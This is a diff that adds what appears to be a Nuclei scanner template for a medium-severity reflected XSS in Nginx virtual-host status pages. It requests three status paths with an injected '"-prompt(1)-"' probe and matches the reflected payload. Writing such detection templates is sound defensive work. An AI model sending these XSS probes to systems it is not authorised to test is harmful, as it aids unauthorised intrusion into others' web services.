@@ -1,0 +1,20 @@
+id: nginx-vhost-xss
+
+info:
+  name: Nginx Virtual Host XSS
+  author: glatisant
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/nginx-status.html"-prompt(1)-"'
+      - '{{BaseURL}}/status.html"-prompt(1)-"'
+      - '{{BaseURL}}/_zstats"-prompt(1)-"'
+    redirect: false
+    matchers:
+      - type: word
+        words:
+          - '-prompt(1)-'
+          - 'nginx vhost traffic'
+
